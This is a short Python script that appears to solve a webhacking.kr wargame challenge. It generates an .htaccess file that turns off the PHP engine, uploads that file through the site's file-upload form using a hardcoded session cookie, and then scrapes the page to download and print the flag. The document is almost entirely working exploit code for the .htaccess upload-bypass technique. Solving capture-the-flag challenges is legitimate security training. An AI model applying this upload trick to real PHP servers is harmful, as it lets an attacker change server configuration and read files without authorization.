import os
import requests
from bs4 import BeautifulSoup

url = "http://webhacking.kr:10002/"
cookie = {"PHPSESSID":"ss0ril4cq0ceomgfbhgdopfgfa"}

def htaccess_gen():
    if not os.path.isfile(".htaccess"):
        file = open(".htaccess", "a")
        file.write("php_flag engine off")
        file.close()
    else:
        print(".htaccess is already exist!")

def file_upload():
    file = open(".htaccess", "rb")
    res = requests.post(url=url, files = {"upfile": file}, cookies=cookie)
    if "File uploaded." in res.text:
        print("File uploaded.")

def read_flag():
    res = requests.get(url=url, cookies=cookie)
    soup = BeautifulSoup(res.text, 'html.parser')
    a = str(soup.find_all('a'))
    flag_url = url+a[44:len(a)-5]
    res = requests.get(flag_url, cookies=cookie)
    flag = res.text[15:len(res.text)-6]
    print("FLAG : " + flag)

if __name__ == "__main__":
    htaccess_gen()
    file_upload()
    read_flag()